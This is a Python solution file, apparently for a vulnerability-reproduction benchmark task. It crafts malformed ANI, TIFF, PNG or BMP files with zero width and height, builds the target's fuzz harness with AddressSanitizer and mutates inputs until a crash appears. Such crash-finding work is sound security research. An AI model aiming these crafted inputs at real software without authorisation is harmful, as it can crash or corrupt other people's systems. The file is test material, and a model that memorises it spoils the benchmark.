import os
import sys
import subprocess
import tempfile
import struct
import random
import time
import re
import shutil
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Strategy:
        1. Identify the file format (likely ANI, TIFF, PNG, etc.) from source code.
        2. Generate a specific malformed input (e.g. zero width/height) for that format.
        3. Attempt to compile the fuzzer from the source.
        4. If compilation succeeds, verify the crash or fuzz briefly using the generated seed.
        5. If compilation fails, return the generated best-guess seed.
        """
        
        # 1. Identify format
        fmt = self._identify_format(src_path)
        
        # 2. Generate best-guess seed
        seed = self._generate_seed(fmt)
        
        # 3. & 4. Compile and Fuzz
        try:
            poc = self._compile_and_fuzz(src_path, seed)
            if poc:
                return poc
        except Exception:
            pass
            
        # Fallback to seed if compilation/fuzzing fails
        return seed

    def _identify_format(self, src_path):
        # Heuristic: count occurrences of format names in file names and content
        scores = {'ani': 0, 'tiff': 0, 'png': 0, 'bmp': 0, 'gif': 0}
        
        for root, _, files in os.walk(src_path):
            for f in files:
                low_f = f.lower()
                
                # Check filename
                for k in scores:
                    if k in low_f:
                        scores[k] += 10
                
                # Check content of source files
                if f.endswith(('.c', '.cc', '.cpp', '.h')):
                    try:
                        path = os.path.join(root, f)
                        with open(path, 'r', errors='ignore') as fp:
                            # Read beginning of file
                            content = fp.read(8192).lower()
                            for k in scores:
                                if k in content:
                                    scores[k] += 1
                    except:
                        pass
        
        # Return format with highest score
        best = max(scores, key=scores.get)
        if scores[best] == 0:
            return 'ani' # Default guess based on task description hint (often ani/tiff)
        return best

    def _generate_seed(self, fmt):
        """Generates a minimal file of the given format with zero width/height."""
        if fmt == 'ani':
            # ANI Header: RIFF <size> ACON anih <36> <ANIHeader>
            # ANIHeader: size(4), frames(4), steps(4), cx(4), cy(4), bitcount(4), planes(4), rate(4), flags(4)
            # Vulnerability: cx=0, cy=0
            ani_header = struct.pack('<IIIIIIIII', 36, 1, 1, 0, 0, 0, 0, 0, 1)
            anih_chunk = b'anih' + struct.pack('<I', 36) + ani_header
            riff_len = 4 + len(anih_chunk)
            return b'RIFF' + struct.pack('<I', riff_len) + b'ACON' + anih_chunk
            
        elif fmt == 'tiff':
            # Little Endian TIFF
            # Header: II, 42, Offset
            # IFD: 256(Width)=0, 257(Height)=0
            tags = [
                (256, 4, 1, 0), # ImageWidth = 0
                (257, 4, 1, 0), # ImageLength = 0
                (258, 3, 1, 8), # BitsPerSample
                (259, 3, 1, 1), # Compression = No
                (262, 3, 1, 1), # PhotometricInterpretation
                (273, 4, 1, 100), # StripOffsets
                (277, 3, 1, 1), # SamplesPerPixel
                (278, 4, 1, 1), # RowsPerStrip
                (279, 4, 1, 1), # StripByteCounts
            ]
            ifd = struct.pack('<H', len(tags))
            for t in tags:
                ifd += struct.pack('<HHII', t[0], t[1], t[2], t[3])
            ifd += struct.pack('<I', 0) # Next IFD offset
            return b'II\x2a\x00\x08\x00\x00\x00' + ifd
            
        elif fmt == 'png':
            # IHDR width=0, height=0
            ihdr = struct.pack('>IIBBBBB', 0, 0, 8, 2, 0, 0, 0)
            return b'\x89PNG\r\n\x1a\n' + self._png_chunk(b'IHDR', ihdr) + self._png_chunk(b'IEND', b'')
            
        elif fmt == 'bmp':
            # BMP FileHeader + InfoHeader (width=0, height=0 at offsets 4, 8 of InfoHeader)
            fh = b'BM' + struct.pack('<I', 54) + b'\x00\x00\x00\x00' + struct.pack('<I', 54)
            ih = struct.pack('<IIIHHIIIIII', 40, 0, 0, 1, 24, 0, 0, 0, 0, 0, 0)
            return fh + ih
            
        # Generic fallback
        return b'\x00' * 32

    def _png_chunk(self, tag, data):
        crc = zlib.crc32(tag + data) & 0xffffffff
        return struct.pack('>I', len(data)) + tag + data + struct.pack('>I', crc)

    def _compile_and_fuzz(self, src_path, seed):
        sources = []
        includes = set()
        fuzz_target = None
        
        # Scan sources
        for root, _, files in os.walk(src_path):
            includes.add(root)
            for f in files:
                if f.endswith(('.c', '.cc', '.cpp')):
                    path = os.path.join(root, f)
                    try:
                        with open(path, 'r', errors='ignore') as fp:
                            content = fp.read()
                            if 'LLVMFuzzerTestOneInput' in content:
                                fuzz_target = path
                            # Skip files containing main() to avoid link errors
                            if re.search(r'\bint\s+main\s*\(', content):
                                continue
                            sources.append(path)
                    except:
                        pass
        
        if not fuzz_target:
            return None
        
        # Ensure fuzz target is included
        if fuzz_target not in sources:
            sources.append(fuzz_target)
            
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create driver
            driver_path = os.path.join(temp_dir, 'driver.cc')
            with open(driver_path, 'w') as f:
                f.write(r'''
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size);

int main(int argc, char **argv) {
    if (argc < 2) return 0;
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 0;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *buf = (uint8_t*)malloc(sz);
    if (!buf) { fclose(f); return 0; }
    fread(buf, 1, sz, f);
    fclose(f);
    LLVMFuzzerTestOneInput(buf, sz);
    free(buf);
    return 0;
}
''')
            
            # Compile
            bin_path = os.path.join(temp_dir, 'fuzzer')
            cmd = ['clang++', '-g', '-O1', '-fsanitize=address', '-o', bin_path, driver_path] + sources
            for inc in includes:
                cmd.extend(['-I', inc])
            
            # Add definition flags often needed
            cmd.extend(['-D_GNU_SOURCE'])
            
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            
            # Fuzzing
            # 1. Check generated seed
            # 2. Check mutations of seed specifically targeting 0-width/height (injecting 0s)
            
            queue = [seed]
            
            # Generate deterministic mutations (inject 0 words)
            if len(seed) >= 4:
                for i in range(len(seed) - 3):
                    m = bytearray(seed)
                    m[i:i+4] = b'\x00\x00\x00\x00'
                    queue.append(bytes(m))
            
            # Time limited loop
            start_time = time.time()
            while time.time() - start_time < 30: # 30 seconds budget
                if not queue:
                    # Random mutation
                    m = bytearray(seed)
                    if len(m) > 0:
                        idx = random.randint(0, len(m)-1)
                        m[idx] = random.randint(0, 255)
                        queue.append(bytes(m))
                    else:
                        queue.append(b'\x00'*4)
                
                inp = queue.pop(0)
                
                test_file = os.path.join(temp_dir, 'input')
                with open(test_file, 'wb') as f:
                    f.write(inp)
                
                try:
                    res = subprocess.run([bin_path, test_file], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=2)
                    if res.returncode != 0:
                        # Check for ASAN error
                        if b'AddressSanitizer' in res.stderr:
                            return inp
                except:
                    pass
                    
        return None